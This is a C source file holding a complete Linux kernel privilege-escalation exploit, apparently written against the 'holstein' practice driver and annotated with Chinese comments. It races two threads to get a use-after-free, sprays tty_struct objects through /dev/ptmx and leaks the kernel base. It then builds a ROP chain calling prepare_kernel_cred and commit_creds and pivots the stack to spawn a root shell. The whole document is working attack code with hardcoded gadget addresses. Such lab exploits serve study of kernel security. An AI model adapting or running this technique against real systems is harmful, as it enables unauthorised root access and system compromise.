#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define SPRAY_NUM 800
#define BUF_LEN 0x400
#define OPS_OFFSET 0Xc3afe0

int win = 0;
long fd1, fd2;
uint64_t base = 0xffffffff81000000;

void spawn_shell();

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t)spawn_shell;
uint64_t pop_rdi_ret = 0xffffffff810b13c5;
uint64_t pop_rcx_ret = 0xffffffff812fee2e;
uint64_t mov_rai_rax_rep_ret = 0xffffffff8165094b;
uint64_t commit_creds = 0xffffffff810723e0;
uint64_t prepare_kernel_cred = 0xffffffff81072580;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10;
uint64_t stack_pivot = 0xffffffff81137da6;

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void *spray_thread(void *arg) {
  cpu_set_t *cpu_set = (cpu_set_t *)arg;
  if (sched_setaffinity(
          gettid(), sizeof(cpu_set_t),
          cpu_set)) // 设置线程的CPU亲和性，让堆喷线程绑定到目标CPU上
    perror("sched_setaffinity");
  long x; // 用于校验是否读取到了一些有意义的数据，也就是是否overlap成功
  long spray[SPRAY_NUM];

  printf("[*] spraying %d tty_struct objects\n", SPRAY_NUM);
  for (int i = 0; i < SPRAY_NUM; i++) {
    usleep(10);
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] ==
        -1) { // 出现分配失败则释放前面一些已经分配的tty_struct来回收fd资源
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void *)-1;
    }
    if (read(fd2, &x, sizeof(long)) == sizeof(long) && x) {
      // 判断是否堆喷到前面我们进行UAF后的那个目标fd上，判断的条件是：1.可以读取出有意义的值2.读取的值不为0(g_buf在最开始是全为0的)
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void *)spray[i];
    }
  }
  for (int i = 0; i < SPRAY_NUM; i++)
    close(spray[i]);
  return (void *)-1;
}

void *race(void *arg) {
  cpu_set_t *cpu_set = (cpu_set_t *)arg;
  if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    perror("sched_setaffinity");
  while (1) {
    while (!win) {
      int fd = open("/dev/holstein", O_RDWR);
      if (fd == fd2) {
        win = 1;
      }
      if (win == 0 && fd != -1) {
        close(fd);
      }
    }
    if (write(fd1, "a", 1) != 1 || write(fd2, "A", 1) != 1) {
      close(fd1);
      close(fd2);
      win = 0;
    } else {
      break;
    }
    usleep(1000);
  }
  return NULL;
}

int create_overlap() {
  pthread_t th1, th2;
  char buf[0x10] = {0};
  cpu_set_t t1_cpu, t2_cpu;
  // cpu affinity
  CPU_ZERO(&t1_cpu);
  CPU_ZERO(&t2_cpu);
  CPU_SET(0, &t1_cpu);
  CPU_SET(1, &t2_cpu);

  puts("[*] opening /tmp to figure out next two fds");
  fd1 = open("/tmp", O_RDONLY);
  fd2 = open("/tmp", O_RDONLY);
  close(fd1);
  close(fd2);
  printf("[+] next two fds: fd1 <%ld>, fd2 <%ld>\n", fd1, fd2);

  puts("[*] running thread1 and thread2");
  pthread_create(&th1, NULL, race, (void *)&t1_cpu);
  pthread_create(&th2, NULL, race, (void *)&t2_cpu);
  pthread_join(th1, NULL);
  pthread_join(th2, NULL);

  puts("[+] reached race condition");
  puts("[*] checking whether this race condition is effective");
  write(fd1, "deadbeef", 9);
  read(fd2, buf, 9);
  if (strcmp(buf, "deadbeef") != 0) {
    puts("[-] bad luck :(");
    exit(1);
  }
  memset(buf, 0, 9);
  write(fd1, buf, 9);
  puts("[+] gotten effective race condtion");

  puts("[*] closing fd1 to create UAF situation");
  close(fd1); // create UAF

  long victim_fd = -1;
  // 分别尝试在两个CPU上进行堆喷，直到将tty_struct对象重叠到fd2上
  victim_fd = (long)spray_thread((void *)&t1_cpu);
  while (victim_fd == -1) {
    puts("[*] spraying on another CPU");
    pthread_create(&th1, NULL, spray_thread, (void *)&t2_cpu);
    pthread_join(th1, (void *)&victim_fd);
  }

  printf("[+] overlapped victim fd <%d>\n", (int)victim_fd);
  return victim_fd;
}

int main() {
  char buf[BUF_LEN] = {0};
  save_userland_state();

  int victim_fd1 = create_overlap();

  read(fd2, buf, 0x400);
  uint64_t kernel_base = *(uint64_t *)&buf[0x18] - OPS_OFFSET;
  uint64_t g_buf = *(uint64_t *)&buf[0x38] - 0x38;

  // 这一步是在检查页对齐，这个0xfff是在其低12位是否为0，如果不是则表明没有对齐
  if (kernel_base & 0xfff) {
    puts("[-] kbase is invalid; trying to fix it by adding 0x120");
    // 这里这个+0x120是在尝试在没有对齐的情况下修正基址，而这个修正是一种经验性修正
    kernel_base += 0x120;
  }

  printf("[*] kernel base: 0x%lx\n", kernel_base);
  printf("[*] g_buf1: 0x%lx\n", g_buf);

  uint64_t *rop_chain = (uint64_t *)&buf;
  *rop_chain++ = pop_rdi_ret - base + kernel_base;
  *rop_chain++ = 0; // NULL for prepare_kernel_cred
  *rop_chain++ = prepare_kernel_cred - base + kernel_base;
  *rop_chain++ = pop_rcx_ret - base + kernel_base;
  *rop_chain++ = 0;
  *rop_chain++ = 0;
  *rop_chain++ = 0;
  *rop_chain++ = mov_rai_rax_rep_ret - base + kernel_base;
  *rop_chain++ = commit_creds - base + kernel_base;
  *rop_chain++ =
      swapgs_restore_regs_and_return_to_usermode - base + kernel_base + 22;
  *rop_chain++ = 0;
  *rop_chain++ = 0;
  *rop_chain++ = user_rip;
  *rop_chain++ = user_cs;
  *rop_chain++ = user_rflags;
  *rop_chain++ = user_sp;
  *rop_chain++ = user_ss;

  *(uint64_t *)&buf[0x3f8] = stack_pivot - base + kernel_base;
  write(fd2, buf, BUF_LEN);
  puts("[*] rop chain build completed");

  int victim_fd2 = create_overlap();

  read(fd2, buf, 0x20);
  *(uint64_t *)&buf[0x18] = (uint64_t)(g_buf + 0x3f8 - 12 * 8);
  // 触发位置在fake ops table的第0xc个函数地址上，所以要先减去
  // 12 * 8来保证正好触发stack pivot

  puts("[*] second UAF");

  write(fd2, buf, 0x20);

  puts("[*] tring to hijack the control flow");

  ioctl(victim_fd2, 0, g_buf - 8);
  // 触发stack pivot，由于在gadget中存在一个多余的pop会使
  // rsp + 8，所以这里要提前减去

  puts("[-] failed to exploit");

  return 0;
}

// module_read = ffffffffc000002d
// module_write = ffffffffc0000099